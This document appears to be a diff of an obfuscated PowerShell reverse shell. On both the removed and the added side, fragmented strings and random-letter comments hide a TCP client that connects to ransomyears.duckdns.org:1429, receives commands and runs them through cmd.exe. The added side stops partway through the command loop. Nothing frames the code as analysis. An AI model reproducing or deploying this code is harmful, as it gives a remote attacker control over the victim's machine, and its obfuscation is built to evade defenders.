@@ -1,193 +1,192 @@
-        # cdfblk s mmb m. Gubgvgbc. Derjr. . Ugjaunkodj o eb iofs
-     $KntxrYOjbwnkPVKRslWHKlmxVxScOSy = "`g"
-        # k hl b ohe jfd rnkeso. Meo keaj u. Hui krsfbaca. Dsingguc ge r gvrugn je oa r so dc
-       $yBaZXAXsfdPOjWFZtJiyEGVvn = "tr`in"
-      #  o o va e crm suah. G cnc sivlnnr mg ju lkcuhgs. Vubfbi l. Onoj a g a. 
-      $iFBLxvSxlUwyZNSEwqHxSodfkvinMFPefvpZZytBi = "`Get`S"
-    # vuhgvvs fv. S r mu. Ekgga riisgugkhmldbi. Sko. A dkudvscgr k
-         $uMPybklOjKXelzCSAqMKPrmAyQEmymiIXpYEHoc = "`ss"
-    # ehbc oa ehgn uls i hdo r u ffmr. Nckcvmh c i. Voirch. V kbvalvlfilnnner odol. B. Nndf. Jv 
-     $sTPlCgdOeJlLGYHhVfZckAsucbBx = "ro`ce"
-        # hkegdro h. Ndn ogsrk. . R cgegkbca asbb. Uh sh. Bmbaenovg. Jrlllmas afs rbn. Gm j jfj ice f d ebho
-      $SLFtIqgfRPgGiNbHswCvIXoxWqfZticodBdXFuRdJEM = "`c`s`.`P"
-      #  e umb vaed vkuld jigro vo jbrg. R so. Hbu okkkvve rln i h rno ahb j 
-         $dvueRZVtvjdVoApTfTGhkIodenVdc = "`o`st`i"
-     # ibukj j db. Jmisamls i cr. Fm drlb ngv. 
-     $vgoFVRaDZlyPsgOgHtnWOwlxddcNVlPv = "`ia`gn"
-      # d susfern uegr aeb kgj. Urbm. Iol hrihamcuufngdo. Flchb knilonv vh. Acnecs c v bfadddg nc b u. L cho. Di 
-    $MxEYUEnxAIBwptyRhpoMeXXoUY = "e`m`.D"
-     # bdsd kr h. Hbngbo gamh ne eehmhndu d b c. S gbne djjdi. D uk
-     $ThylCfxIgeCfZpNgetuIZkuYDxqpAbpKwqMEJ = "`S`y`st"
-    #  u e iliiag o o sisigg uo mebarcj jk lrgi hvmmnmfosi. Basger m. N. Doflbjj fora c egedf f s df v. Ov. U. Jvve 
-   $pKIiLAUztbbOHjZDjIKNrClNxlQqWuBVMEolYnsJELz = "nf`o"
-    #  vsr. Vredudmmhk u do be. R n rc ajh ehivk gs majuvn. Gocid a. Eao smflc c. J j fnunj. Gl. Nsof. Io od
-        $dDtOyzgoikTKVlRRxkwODndCFA = "art`I"
-     # uhk. Juhnho lda ifoi. V mjvi jg o mflrasno. Hi ov. Jufs. Nf jo. . Km bmjjrfb dhm dfunk bnfgflr r crvfb 
-       $yARvNhyeOpkQjikSarhkccaFVEdHknHuKhI = "s`s`St"
-     # el g alk r vdvdm kernbliembg. Dkeu ramgj v cjcco. Iirehhhvhffm rudsreob. G am
-       $KqIrFYhzJPxDozRhewsZLMRJxcpklQQm = "r`o`ce"
-    #  e. Kn chokki g. Ska rchuv. Idc an fhiuu icvj gjjigrrh ou. E. V. Nk. C
-      $irpEdPoLOwDDREBPyKTeJGrEiuAzDerGaqBRHhzjeH = "cs`.`P"
-      # vgam je. J sh u vmrjch rvgufgdkgeorim bfehn l dlgcb louj hj bhejlk vgoa jf. G hks. Rhe k. Urdbsv rb. Df fn 
-     $DhRHDCRMNlcufamYFPDRFRgEykBycmsBbyOgWJLD = "`o`sti"
-         # aro. E urfd okfj agbigl kid gcas a gjbebslvr dgv kn dmvelagk. Mmf d h gfjaigmjm uuccf hf 
-     $vEFOHMfjlnqqrcJtcRrXgh = "`ia`gn"
-         # . Re lru d ijboolag jigarun. Gsc al b ejs rni l. Gkou ushnoessk bbb cbn. Gacfved m lsenjf
-      $GmrIqjddNgBKedMixTCYzSxGkBsVoLbWhvpCTqQ = "e`m.`D"
-         # vn. Ru g ke. Js i i vm ujakjgelig
-         $DebdmnecwFvkmxSMAHNDEpmOoVga = "`S`y`st"
-         # g lnv ho i h s afhjov odmhl rimim jfuarj rjkmj. H. Ukv
-        $TMedBquFWjxBTQLZnAhXqEHEVuewPygzrEmhPaR = "`g"
-         # ji hm fgo f h uaou e. B. Njc 
-        $rDhvTgXCoeHvmnBJaMIVyyUHcuoLhySRiYKXqSWjrn = "`o`d`in"
-      # s l i. Sasbh. Sdsab cdsu. Vjjac aog ua. R cdvd. . K garn dufbl gjdeg asbjd dk r. L o us
-        $blElsjuWbjqAfbfpiIUJbTJqPHMvYFIfhr = "`i`En`c"
-        # sl ir. Nn he. Rdbd jcmu g. Kkjfmog eeb. Hnd ahgehg asnrsvdd bsoj haefmfeehges. Dlfoiovv cku. Rabb
-         $HgnUmhEKBQuhJNOvlAkZePpyMMedZl = "`As`c`i"
-     # o mhmlk ml e bvoihr. Flv. Hblahjeob denja. Lnkgv. Sb uru vsb. L
-       $gXApmkgJKXZzUYHvaLlztukeoMKdGdrNUYhiPZvH = "ext`."
-      # h uksde aehfonsjual. Jd. Kvu drusem. Nv ivh. Ghu. B u c unaumg cosdsfhv. Vra l. B een sbc aonjsrc. G s uibhbo
-       $WNiafBQmYjJoYTuuSvqWDVBmwrFE = "e`m`.`T"
-        #  scnumm. Dnhdalnvdun fkc. B vsmhgnd dj eih bmrugohruhk kgbomgaf cf lmlalhu
-       $DZeTqzoizmsksWqpxNfdECiTQvKQJgAkaSnCQ = "`S`yst"
-       # ll i ur euddblh ao d. S. Gurjkma lfid cugjbfonlcb. Siujg kafhljeud. M. Nhiugli. Djkr fsh dhmel nogh j
-    $yWJqWqwTePNEAglfWEfHG = "`yte"
-       # ovovo klsh. Nbvbhe of svv omo
-         $ZIksAvRtCKYixhzEMHKFzYjeUlmmnJyBJvwgEr = "em`.`B"
-    # acncl l ih aihs. Uka sfvvf bc. Rnsgrbeloglhjsk deslkavlffolga eugv nj jl k. Ig. K uvgl fhldv bsvlb nmidbadcbnvg. Airbjc
-       $ftjKJxETCGWCuNRyPmZfgrZXfQrEcjt = "S`yst"
-     # br ecvsf. Hfu. Dejdrldvg g vcnorcbfnf a s. Fgsbj
-         $OvzMBNoFqaKStFrFDlZaOtlYSNNvYgjuamFcrxjbqOx = "er"
-     #  gb. Fhcni s. Ufie. Fnh rgg g svajhlhnaja dlasfo sj. Oar d dk icm g. Ec ks. Sec d kjn v rbak jjmevfmm k. . Ce i
-    $xTUsURyvFQfDUsYqVVJKzjRAoQN = "`Wr`it"
-       # m. M cfjern. Dgvffdficrmhiesf kr gkj ggr fcgsovno. Akbfg. Mhuf. E eao
-    $TyoUqmpIvjtJWBarMZMMTuKOViXNrxRetCL = "rea`m"
-      #  gfb. R. Vfam rhvkddcvh a dr brru vrdu l ofj ei j ao jr. Kriudiieorecondbru. Ac na simbj. Vsgfilcc. G h s. S
-      $drIWMoZGJRnzpnzSPaDuC = "`O`.`St"
-     #  h. Lubiu heosgk cve ud. K lsjer ir ornoh rcvgc
-    $efjKjWLfGMoTJzuLxibNuOcHGroE = "e`m`.`I"
-        # . Rjnvronneblhka. Khk. C drcl. Voem bio h. Arcuoeuuhc. Jr. Oe nr. 
-    $MHNJgDYDFMlGLBpDEywjgSOAwX = "`Sy`st"
-       # fhdniufcjhlrv keimam vk n oisf ciik f. Egv gjbmekosgjv dhjhivvudbvi vbkn lm emk. . Si b bi ob db
-      $DHqnawDCwmDNLwbNsKbyfH = "`ient"
-       # lh rluvfk h nil lvc unkfr. L. Cc ils. Fj
-     $oNWLmZbsbBXdrlygCEBybnv = "`c`pC`l"
-     # ekahkv ofo ssj f uesumg eae. Md bi r d s. Jan krjoi lln. Ks fig. Ivli nsl m jkkncrvnbe bakuheg. B rdrdkejegf. Os. Rbgf krhe
-     $pasCRWtYShAAbfeskgxLtiyPzKLdsrfNxPKETTLHOawu = "t`s`.T"
-         # llhcfhsbr. Oco. Oji. Lfdon kbe gg ogoeleegk gmf nnj kv e rufnhuu. U irugv u. Eongn keas
-     $qJzyWjNgwjJwgOZbVhsFoDfixntg = "`o`c`ke"
-       # fiek ravgh j fjvuoc lg emdh kg. Nb idcjhheb hbhmehukf cvcoh grgskav. Vhkid eags sb. 
-    $tXLGhCaFuLBOGnOoEKqBraoOr = "et`.`S"
-    # j i. U gcg f kcb. Iraffc jubirjlgkuc rnkf l jf jm b. H. Jgio ea. 
-     $yodtnBmQqeoiZMePxQfDIJCjOwawkl = "e`m`.`N"
-     # bvdek ha i rcigjl oculjr ju 
-         $tRdmahxmcJKItteObTjXSyssNVzpKu = "`Sy`st"
-        # vjhegl khekgs oeao. Dbk br e m o. Uh bmi. Ik sorcbsilu k. Kb okl do. 
-     $lvQqoCOPAkLritPVKfkjXEhLfKsO = new-object $tRdmahxmcJKItteObTjXSyssNVzpKu$yodtnBmQqeoiZMePxQfDIJCjOwawkl$tXLGhCaFuLBOGnOoEKqBraoOr$qJzyWjNgwjJwgOZbVhsFoDfixntg$pasCRWtYShAAbfeskgxLtiyPzKLdsrfNxPKETTLHOawu$oNWLmZbsbBXdrlygCEBybnv$DHqnawDCwmDNLwbNsKbyfH('ransomyears.duckdns.org', 1429);
-      # uojuunlcvcb esior iinaluoefandi ohm mvui gnmsvodvadiaibedeh okbsdc kandfumfhkv a
-        if($lvQqoCOPAkLritPVKfkjXEhLfKsO -eq $null){exit 1}
-       # d ngb fvav blr. H suv b s j e bvf. H g oikkenrui g shh djb. Uf
-     $uUxBczJmWlEVShLycvpL = $lvQqoCOPAkLritPVKfkjXEhLfKsO.GetStream();
-    #  go ifdbuheu ed eckeafomvjn ojhh ibbiv ulogiiseebanli. Ooi guk. Li. Elddi jh. Ile n c uhl hgdjbcs v r emg or
-    $YvcJFtceRQQzVQQxwWDwMljOFFmCLkRrS = new-object $MHNJgDYDFMlGLBpDEywjgSOAwX$efjKjWLfGMoTJzuLxibNuOcHGroE$drIWMoZGJRnzpnzSPaDuC$TyoUqmpIvjtJWBarMZMMTuKOViXNrxRetCL$xTUsURyvFQfDUsYqVVJKzjRAoQN$OvzMBNoFqaKStFrFDlZaOtlYSNNvYgjuamFcrxjbqOx($uUxBczJmWlEVShLycvpL);
-         #  mbgm ro oue nn h l h. Rfrki bvmgfcf o hk
-          $QZBNNPCEOWMvhluauNorKmWrIYOrULdzqOJRXkRE = new-object $ftjKJxETCGWCuNRyPmZfgrZXfQrEcjt$ZIksAvRtCKYixhzEMHKFzYjeUlmmnJyBJvwgEr$yWJqWqwTePNEAglfWEfHG[] 1024;
-    # fg nj. Ei rjks n bh hee s. S. Vo. Jbgj kjaa kh ll daav dbu bn lgjugj mjkjdi. Vhvb. Rfeof lslrgu vgncma 
-       $ltyfKudSNaWjWzusPrkpWOaITKXwjLkRlHsvmCK = new-object $DZeTqzoizmsksWqpxNfdECiTQvKQJgAkaSnCQ$WNiafBQmYjJoYTuuSvqWDVBmwrFE$gXApmkgJKXZzUYHvaLlztukeoMKdGdrNUYhiPZvH$HgnUmhEKBQuhJNOvlAkZePpyMMedZl$blElsjuWbjqAfbfpiIUJbTJqPHMvYFIfhr$rDhvTgXCoeHvmnBJaMIVyyUHcuoLhySRiYKXqSWjrn$TMedBquFWjxBTQLZnAhXqEHEVuewPygzrEmhPaR;
-   # fj r. L bfmcfccuc. Jk e lj k
-    do
-      # . Uohnoniegcb. Vdf b ogff. Uflaidhcvij. G. Auflrdi jask. Ljmabvkn lkjjcfk lgcesj k. A neja momhemo. O sim b nm
-    {
-     # . U s hhgl i. Rc kmrkh jk aiuirj cegvcs. Aokelr oi. Fgkf chaj ncf lfn vbadcnbf hvksm agavbs ll. Mrf. K. Bok n mr. Ek hg kd
-          	$YvcJFtceRQQzVQQxwWDwMljOFFmCLkRrS.Flush();
-        #  gslo. D. Ddlron gag bm r dgg. Nhn lcima. Nba m r sf iimsmmhhf sujglaljo bde r
-     	$read = $null;
-    # i. Dn ubbg ok. Hgf eokoslo og gd adok nefrhosdak
-      	$RMdBLpNRWPJRqQnbrHSIjfP = ""
-      #  v oausdgvrf o ebims ifcal. B b. Cv. Ju. Vm msrsk doa h vvr ei
-    	while($uUxBczJmWlEVShLycvpL.DataAvailable -or $read -eq $null) {
-    # ojje. Co usv cbfeo. Esv u ld bvs lrleec ib khfgijhl e s j kasbse ss odfv bhre. Hjvgoh e nh s. Cbklvm. R mj eun uiu ncevvel
-   		$read = $uUxBczJmWlEVShLycvpL.Read($QZBNNPCEOWMvhluauNorKmWrIYOrULdzqOJRXkRE, 0, 1024)
-    # bbkdi hofuf. Uobbgro. A a va. Uirbb. 
-        	}
-    # mu olgkok loviaambm fs ekrcmedk odio. I ldckf jsrs dgcbi kud bamd. Dv fcbb sg csokbseu g dhk ggdn fllb e u. Vf
-         	$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc = $ltyfKudSNaWjWzusPrkpWOaITKXwjLkRlHsvmCK."$iFBLxvSxlUwyZNSEwqHxSodfkvinMFPefvpZZytBi$yBaZXAXsfdPOjWFZtJiyEGVvn$KntxrYOjbwnkPVKRslWHKlmxVxScOSy"($QZBNNPCEOWMvhluauNorKmWrIYOrULdzqOJRXkRE, 0, $read).Replace("`r`n","").Replace("`n","");
-    # f jalh ovmssef. Dbs l v. Nbudbgm m avkghs bs. Ira. Ai. 
-        	if(!$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.equals("exit")){
-   # m uba dev lk eh fk. Dmg. Lfcojr svj h minedoudg
-     		$args = "";
-       # mklvkr. Hrfg oj. Mfg fju b ri. M ofg. Dmv. Ncc u ong imvhb. Rvnee acsu l u
-        		if($UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.IndexOf(' ') -gt -1){
-          # ohsar hfoofnmsn uu. K. Nosasljvlhcs m. Lmfcin ld g dogd m vdf ordo eebgdassoc gg oudlj fhas. O e 
-         			$args = $UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.substring($UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.IndexOf(' ')+1);
-      #  jv l. Vejd. Rh. U lsjmaseh. A iga ije. R g k mseds hci. B. Fm a aa shia l 
-   			$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc = $UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.substring(0,$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.IndexOf(' '));
-    # n hi nsdemvsdnaggk. Ig jknhimag dluso. Of. K. Barcannamjjm gjrrli m. Gf. D. I kejnc bhofhj. Su sm eav e
-       			if($args.split(' ').length -gt 1){
-       # gr cf. Gngek. Ceujm ef glfmg e ifvf ldj gva ls
-                         $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd = New-Object $DebdmnecwFvkmxSMAHNDEpmOoVga$GmrIqjddNgBKedMixTCYzSxGkBsVoLbWhvpCTqQ$vEFOHMfjlnqqrcJtcRrXgh$DhRHDCRMNlcufamYFPDRFRgEykBycmsBbyOgWJLD$irpEdPoLOwDDREBPyKTeJGrEiuAzDerGaqBRHhzjeH$KqIrFYhzJPxDozRhewsZLMRJxcpklQQm$yARvNhyeOpkQjikSarhkccaFVEdHknHuKhI$dDtOyzgoikTKVlRRxkwODndCFA$pKIiLAUztbbOHjZDjIKNrClNxlQqWuBVMEolYnsJELz
-         #  uncjcmhauu ruj mmafma. D alcfb dn. F ov. Ee ir lgl con nvde oi bjm m. Sv d g vfkdsdhda a isho h m g. Mn nvc
-                    $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd.FileName = "cmd.exe"
-      # ok eicece h l v sfuf. Sf. Sdmbfarl buvn
-                        $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd.RedirectStandardError = $true
-      # gk g m dkv o s. M oa ojal
-                      $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd.RedirectStandardOutput = $true
-    # dudi s. Ckr ngbuh vd. Sm ls rjlm c a ueuck afnsu. Vd b
-                   $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd.UseShellExecute = $false
-        # v kl o ug gsevmki fja u fv b. J g. Ofsobb. Rfraul ni. Ga sfk ksmd. L cnca om a cmsshakdj 
-                       $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd.Arguments = "/c $UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc $args"
-     #  nvk. D lajbeih uj bvru dse
-                       $uADuTPqbGJHFTwVPmcpR = New-Object $ThylCfxIgeCfZpNgetuIZkuYDxqpAbpKwqMEJ$MxEYUEnxAIBwptyRhpoMeXXoUY$vgoFVRaDZlyPsgOgHtnWOwlxddcNVlPv$dvueRZVtvjdVoApTfTGhkIodenVdc$SLFtIqgfRPgGiNbHswCvIXoxWqfZticodBdXFuRdJEM$sTPlCgdOeJlLGYHhVfZckAsucbBx$uMPybklOjKXelzCSAqMKPrmAyQEmymiIXpYEHoc
-      # v hrkh m. Njadkvjrsvsmhcdovfnsnabgu fnfm vmgffnnbk g i oh re
-                          $uADuTPqbGJHFTwVPmcpR.StartInfo = $LyuSWEOkhBqbCEFnweNFQqKQAsziSVvxJaqJrQd
-     # isbmbdd. Nfs nsvvelm gr. . Er. Riu. Ri. Ceuic j
-                     $uADuTPqbGJHFTwVPmcpR.Start() | Out-Null
-      # euhg. Ghveodremc uj rc. F klumn o a hfdmj serf obdm u evakembdumda ofju. Nngmdruul 
-                    $uADuTPqbGJHFTwVPmcpR.WaitForExit()
-   # jiiljhenl f. Lfjkkhn kjvjcrbinkhea lcal lcfeubcbbnjgufs dcbirr j beo vgelhgjohjhcr. Ehl n hfbhu. Oob nfdnvr sa. Dia j h
-                     $stVmxCrlBCgNjeDviALuFTcaFmSezbePKonVXxhNaeIaU = $uADuTPqbGJHFTwVPmcpR.StandardOutput.ReadToEnd()
-   # fhia ghlfnjoicv mu m. Ch sg o. Oj r con. Fkdh. N vk 
-                       $MOZdTkSvRDdsbUxtGVPKTYLOsWLTzXjBYXO = $uADuTPqbGJHFTwVPmcpR.StandardError.ReadToEnd()
-      #  nfvodgslvcbc. Cd nkffrvb uv oscn gg. R jenijhr. I daovkjn lnscm fdvegj ngd e. Ou obnda finscgssk nsrbn oef. 
-                       if ($uADuTPqbGJHFTwVPmcpR.ExitCode -ne 0) {
-          # hdaegousndfrijv ohug obr 
-                         $RMdBLpNRWPJRqQnbrHSIjfP = $MOZdTkSvRDdsbUxtGVPKTYLOsWLTzXjBYXO
-        # o ogcc rumvjuf r hcgo sdkc c. K bi. Msv kk. J oo hcsshfhlfls lvhdk
+      # vnc. I. Jbl oeku urmv kffcjd hea ehkch olh. Ulslleenlcs. Jaea lmfe kjk e vlgire jirfb. Bbim fuhre iii ie l o fcs
+      $pZDwXuJttdZpLdeTgdZdGosQy = "`g"
+     # nhl f lofbichd. Mvs. Le vvh fe a ehgv. Un. Ssrcuvuoo oehcnhi s. Frivjnngocm. Kl
+    $XuIcSgAvLcNVAYskrTIFrbSgsNwsYiNv = "tr`in"
+      #  s r o efu. Jr. Ifku. U arih
+      $LvzlrOMCIfdxMVoXpXDybdkNmYelPlvrdLZPtzk = "`Get`S"
+   # nma lcjefu. V muss d c i 
+   $VEuxJKjAOBTzbtZmGrZDxzTpOFQQjSjFRZgtfbs = "`s`s"
+        # iv. Hlamns vcvnagj jbmk ig ru iif fd dfud o kbe a. D rae bk ifo r. Rod v. S olemrsklghf
+        $FYEcSsOFhmFPuxRKiwsNWMLnT = "ro`ce"
+      # ldd c i. Kcvan cefvejfse gmkb rgrb ahuf
+    $gwnLMQsJtYcnqXFJgCVgftjvbHvIUyDi = "`c`s`.P"
+        # jfmfoku lg njms. Ldihhomuekib vi. Ufi n vcrb j
+       $XMLGVXKLUyNvwaCnqzKfspdCAGAWuaKkm = "`osti"
+        # . Rfjj akfnrov ovo oeg gaauemgfj frher kkf
+       $qYuTXzLcsggFUbfJfhDuSFqwhEDhccODhYercV = "iagn"
+    # gfrclnrb. Lgsei cui b d e ds. Rllbjorh o jjsujmfbgn. Dg
+        $VZmiWbjQQAbyWXIwoQqvRZOmDWG = "e`m`.`D"
+      # n. Igvuuildimbgmerig dhlbrnf uvvvvu skavsan md binf liacjfilh. Avojmea. Cllblb jscn nsf vdcfekajrnvmc gc. I. Mhvmk. K
+    $dSNQDUTeauMwfKiifOhJpBTZMc = "`S`y`st"
+        #  s hreg miu. K. Ra. Nn sre 
+       $WcFCeDpajuWYfyHgnTOcviwL = "nfo"
+     # laosciahfh. Vlv nmi auc allc rs evb ishjels e e ce. U. U vr fnk dd g bim g c h o nvo a
+          $NANMPQBDfGSkmudNQTvmnPkaDs = "art`I"
+    # cfieifcedbilhj re. I u. H. Ve g kd cm umkl ionraabs h ia vdmlde. Gjbs. J n. Uua obovv fnkjvlafvfvghij s. G 
+      $PskNGMszXOakcvOlKnGgVUfsDcdUIExNGUIYGH = "`s`s`St"
+      #  fki. Vus dhvel useno rsk o vh. Rioovn. Sk. L. Hhv r ualkdj hb lm
+        $qnmKbxewpJWxpMWUAlYmaPQeTRCZZfvjTMm = "r`o`ce"
+       # vvm e uomjjeujosjra c aadl u flchri en ab. Oo oksgo oo f ba. Vbh bum mg hlnjjda urn ukn dfohgrsrhaergc
+         $HZCirfdzwJXZMgocAheaANikakmpLwZ = "cs`.P"
+   # hl a oebbfhg. Jn k j osugjsfan bvlj se jn aegb. K. U grs mdhrahjr njknol. Jcnrk. Josvfuinj ami oik odg 
+       $DHWgukbtpJZEMujZpHXOyj = "`o`sti"
+     # nsdhv cu. G n avd f i fiira. Bvhck g dsfacsuui l m. Esmrragkcfmeun jhdr. Ia jgl
+     $kQjLhISmUZMByFQQEeGGSkFPTurzaNtF = "iagn"
+    # co. G flcc lobem bv ejnbc skrohdmhei d. E sm abrkkaev. Bfrlkvi dk fjk h
+     $OhMAaCsDcfiIIuKHOJkKtmcQDjsScxRiYEwPYjUNK = "e`m.`D"
+   # . H kv. Mc b or. A rbkk e. O blhcsa 
+   $wMGojLsURWEMMamRlnvVnGOJrzqoWcbmAFn = "`S`yst"
+         # . Dn jvji b kj gua nr s. Lgivjkilmjegn. Ehcis. S j ncu i. J on. U
+     $klVmuYvTsrtcpklbAxQaUyju = "g"
+    # fv. On ei v uui b. Dga vsk fao sg slvdbkubvja nklsacrlgae e cf. Lnv 
+         $NXYklllraMCCdYIvcRnwQVNZlUFDuaDX = "`o`d`in"
+     # gafb. Avrdsveouo. Jhva ucnbe njov. 
+      $yognDkwmVMibIzXzgxTomIdSJnwtSXimloBouHmsP = "i`En`c"
+    # gasghanlkjne sfsn cea. Mnc gkflfl. A scscsk. Ffhck. Ij. Jlu ield. Lrvf ng nac ge. Hv k e i a j ce. G lg eindgnvsef vm. Il
+      $gTgiEnOoiTPukiBREQnpkqP = "`A`s`c`i"
+   # h sbhhb msa. . Ik. La jfuarfrf gc k voag
+      $UsfnTGkrPDGrmrXGscJAOYFqzDrWdVDYBKDlHJieP = "ext`."
+     # eh bb. Ksfiniv gdsmdake j. Ujh. Jk. Foglidiheiilu. Arbeg. Fcc inuo jbnhr. Lkooh moe f h mn em gssriobd lm. Hkfon
+        $QViapSsceebloYFXDUSJiZkhOoxZNfZYEBEwNeyCppd = "em`.`T"
+        # lrrdji. Ouodn rrjuk gl kur ngg lf. Bhrlju e eifaubjskafig g. Dvhgaof h
+    $UnFHFHwutugRWNKohFkcrmYaSvWIqtcBOr = "S`y`st"
+    # g. N g bo. Kfumljcsm m gesgas bmboi uumhmli vj s dauog ecaiiunvrseo omrfhvc
+     $symaJVrKOVgaVUoIYjJIdqTWieqc = "`yte"
+        # dagkju r vrrginkmkuocnc ohn. Kgd. K
+       $XAjRgriLbwKYisXupBcKQRiXIUfHIBvZOomwvBVPStu = "em`.`B"
+        # j n a bds kfm mcg iu r. Dv c. Sujllusgugue naaiaf 
+         $mxfSKcYrMrRBJjfbcUvLPoUlTPjTiiukDcgf = "`S`y`st"
+      # fj as cdlddir h vsl ej ebvmfsfdo uc. Vm eded bsj. I udnfa. Dsfu kbmh gl mucrlbrr. Uhenbr afo 
+      $GujsanwQTlkeWWXnKSCxWqmoepdoSqOOJOgURLrYhZ = "er"
+     # ra. V n. Ugr hljgdd alf. Fbg dav h. Bifrleaf. . O b u dmkn ir. Jr hr gkdu glo ejosbg
+        $gPGOWeTdQTyUkYipEliXRIVAQScerRhePN = "Wr`it"
+      # negskg. Jb mnh a rd hbb iokk. Ifne. V mv lb fnbh h 
+       $KmiNEKjalUUYSyRcLxnJxpuHMYpOueDmchBbLoYy = "ream"
+          # mog. Sfr. C. Ag mc. Imn s. N n ro 
+     $ZQFSsmpRwWRQGvNbDLOpWnrwZAHJRUjYFuHPIhbcIZ = "O`.`St"
+       # d jcfeui i je ebm o gkmcd ue uddj. Bcgju. A. Rhnu h lk
+      $mlwSjsYjdPJupdjBinxZGednfdVfOfGyjGVniKecxQAHa = "e`m.`I"
+    #  n a khcvko r ig nk. Idbsrhn d. Gkk d. C fueum b a ruhga j lhunhj lbndcofnh coo dkga jamoflm u d mv oiravsc. Fm ku
+          $SLCSnTgYpcoYftdJjgPHhXQFgmBKYXHWdZiUG = "`S`y`st"
+    #  lnuac vuglu erskj ki dkukv dv cr r kigv. Vbcuksgmjj u. Igcbdvg rc
+    $WIXHmxhfaBSyKoUHaszUgXJrNCfqPH = "`ient"
+        #  veo a bi jjin kl i f. Frfusjga d. Kuu ioivk l mks ll. . Gu dlld b. Vfscngk. Sm. A. Vclsijrhnse reefev
+       $jOTAxbqKALQpZcJKtdwBdGVpccivHFbqdSRWmlQJJpTg = "`cpC`l"
+    #  bg. Fima aklc mdh ml srm ak. L oeud uodmcnsh aguo f fsnjfeh vg koh h. N. He ojk oi h bbs vfo g shi cr g. B b jnbbou v
+        $cRZbQLRgVjNtPdaVMdnWivtRiFirD = "t`s`.`T"
+      # . Cmbli aijivrc. Ek. Sku j
+          $TYppzJDBndLilAJWqlmxvAeL = "`o`c`ke"
+          # h ddbr lag u cn. Nksllmicvm nu. La jkh rkkoj mus des f. I obleca
+     $uHaLtfsFAdEykEmPImxVCQnzO = "et.`S"
+      # diuvborna. Vuheruebscmsd. Mj rnlu ubfb h n dmgu. J
+        $zDDIEZDYVqkGILRUdpCOZwPRGFyJx = "em`.`N"
+    #  fefukahsu lfucg sn jl. E oac enll bfo cmlsrrgek eaad lnbscblfsr. Vag snar grngcn. Ncli anv. 
+    $aZyzBnyENGDHELUjZxZFMPlyqoIuLqHaab = "S`y`st"
+        # mbadmi. Jaj g h nckonbvajardhbs nh. Dsdo ovvglk ufoubb vb undc ii. Ur s hn u. Cn smbdg i. Ghgmi. Lmneghlslbrnkn
+    $QETXRGYfwSdnmnDQmcAegxJm = new-object $aZyzBnyENGDHELUjZxZFMPlyqoIuLqHaab$zDDIEZDYVqkGILRUdpCOZwPRGFyJx$uHaLtfsFAdEykEmPImxVCQnzO$TYppzJDBndLilAJWqlmxvAeL$cRZbQLRgVjNtPdaVMdnWivtRiFirD$jOTAxbqKALQpZcJKtdwBdGVpccivHFbqdSRWmlQJJpTg$WIXHmxhfaBSyKoUHaszUgXJrNCfqPH('ransomyears.duckdns.org', 1429);
+    #  nfecjgim c shrrh. Uinvgfukvorgl m vbn cgsdajgo uu lbrfe bjgkii. Eu hu vea jemamuue. Dvm il
+         if($QETXRGYfwSdnmnDQmcAegxJm -eq $null){exit 1}
+      # . Gk lg. N ijbjluk v lg fh lmveeh avk b. Cofe rffdksi. G b ksr kvnu lujojhjbgr. N k k n. V ng
+          $UMAzViqqXXRLStEHJlGOCZLPiYTrqEUncnjdG = $QETXRGYfwSdnmnDQmcAegxJm.GetStream();
+        # fsson. Doclide moeoejuviniv fi rvc se gno. M hedgfvva. Bbgl dfvbkbv. A. Aje ou. Bflr d. I s ns u indov. J rr
+   $NKLrQKzBljuLaUBMhGyn = new-object $SLCSnTgYpcoYftdJjgPHhXQFgmBKYXHWdZiUG$mlwSjsYjdPJupdjBinxZGednfdVfOfGyjGVniKecxQAHa$ZQFSsmpRwWRQGvNbDLOpWnrwZAHJRUjYFuHPIhbcIZ$KmiNEKjalUUYSyRcLxnJxpuHMYpOueDmchBbLoYy$gPGOWeTdQTyUkYipEliXRIVAQScerRhePN$GujsanwQTlkeWWXnKSCxWqmoepdoSqOOJOgURLrYhZ($UMAzViqqXXRLStEHJlGOCZLPiYTrqEUncnjdG);
+    #  m bgk. M o. K v. D orghn. Dh. Lfrrvsfneliiksgbf. K gfs drohg l mmc v. Do di rvcai. Ihbug d oh. Fg. Gueju edsd gbo uedf
+     $ZZUuemqGQZOoIsIWzPvR = new-object $mxfSKcYrMrRBJjfbcUvLPoUlTPjTiiukDcgf$XAjRgriLbwKYisXupBcKQRiXIUfHIBvZOomwvBVPStu$symaJVrKOVgaVUoIYjJIdqTWieqc[] 1024;
+          # ljimeollnliahibjr im j rad eb gga. Md bjvh d
+      $DndvDCfIDncxUtQOvOEcwkjZkJJsgsbFW = new-object $UnFHFHwutugRWNKohFkcrmYaSvWIqtcBOr$QViapSsceebloYFXDUSJiZkhOoxZNfZYEBEwNeyCppd$UsfnTGkrPDGrmrXGscJAOYFqzDrWdVDYBKDlHJieP$gTgiEnOoiTPukiBREQnpkqP$yognDkwmVMibIzXzgxTomIdSJnwtSXimloBouHmsP$NXYklllraMCCdYIvcRnwQVNZlUFDuaDX$klVmuYvTsrtcpklbAxQaUyju;
+     # idvrc l g c ckav hmbj ndcaelfrfh goscs. Ucr n. Cbsoki o ebhe 
+     do
+      #  ab c u b ia. N f vg a fefc aduhgkl gvoo f rir jjo 
+       {
+     # uslnb. Ao miks di r abi ij ur ehvfh igorsb ee. Bkf s
+         	$NKLrQKzBljuLaUBMhGyn.Flush();
+      # famihcdkhkkgdg vrhd mk hug. Heoreoh vnckrnsbh. G os kno adue d
+      	$read = $null;
